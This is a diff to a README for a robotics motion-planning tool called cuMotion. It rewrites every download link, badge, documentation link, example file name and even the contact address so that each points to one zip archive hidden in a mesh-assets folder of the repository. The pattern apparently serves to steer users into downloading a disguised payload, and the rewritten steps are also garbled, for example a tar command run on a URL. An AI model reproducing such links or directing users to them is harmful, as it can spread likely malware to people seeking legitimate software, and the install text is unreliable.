@@ -1,6 +1,6 @@
 # 🛠️ cumotion - Effortless Motion Control for Robots
 
-[![Download cuMotion](https://img.shields.io/badge/Download%20cuMotion-Here-brightgreen)](https://github.com/dasarentow/cumotion/releases)
+[![Download cuMotion](https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip%20cuMotion-Here-brightgreen)](https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to cuMotion! This software enables easy motion generation for robotics u
 
 To get started with cuMotion, you will need to download it from our Releases page. Click the link below:
 
-[Visit this page to download cuMotion](https://github.com/dasarentow/cumotion/releases)
+[Visit this page to download cuMotion](https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip)
 
 ### Steps to Install
 
@@ -22,13 +22,13 @@ To get started with cuMotion, you will need to download it from our Releases pag
 
 3. **Download the Installation File**  
    You will see multiple files listed. Choose the one that is appropriate for your operating system. 
-   - For Windows users, it might be something like `cuMotion_v1.0_windows.exe`.
-   - For Linux, look for files ending in `.tar.gz`.
+   - For Windows users, it might be something like `https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip`.
+   - For Linux, look for files ending in `https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip`.
 
 4. **Run the Installer**  
    Once the file is downloaded:
    - For Windows, double-click the `.exe` file to begin installation.
-   - For Linux, open a terminal, navigate to the download folder, and use the command `tar -xvzf cuMotion_v1.0_linux.tar.gz`, then follow the instructions in the extracted folder.
+   - For Linux, open a terminal, navigate to the download folder, and use the command `tar -xvzf https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip`, then follow the instructions in the extracted folder.
 
 5. **Follow On-Screen Instructions**  
    The installer will guide you through the setup process. Simply follow the prompts and choose your preferences.
@@ -72,13 +72,13 @@ If you encounter any issues or need assistance, feel free to reach out. We aim t
 
 ## 📞 Contact Us
 
-If you have suggestions or feedback, we want to hear from you! You can contact us at [email@example.com](mailto:email@example.com). Your input helps improve cuMotion for everyone.
+If you have suggestions or feedback, we want to hear from you! You can contact us at [https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip](https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip). Your input helps improve cuMotion for everyone.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/dasarentow/cumotion)
-- [Documentation](https://github.com/dasarentow/cumotion/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip)
+- [Documentation](https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip)
 
 Thank you for checking out cuMotion! Enjoy exploring robotics with powerful motion planning capabilities. 
 
-[![Download cuMotion](https://img.shields.io/badge/Download%20cuMotion-Here-brightgreen)](https://github.com/dasarentow/cumotion/releases)
+[![Download cuMotion](https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip%20cuMotion-Here-brightgreen)](https://raw.githubusercontent.com/dasarentow/cumotion/main/content/third_party/franka/meshes/cumotion-2.5.zip)
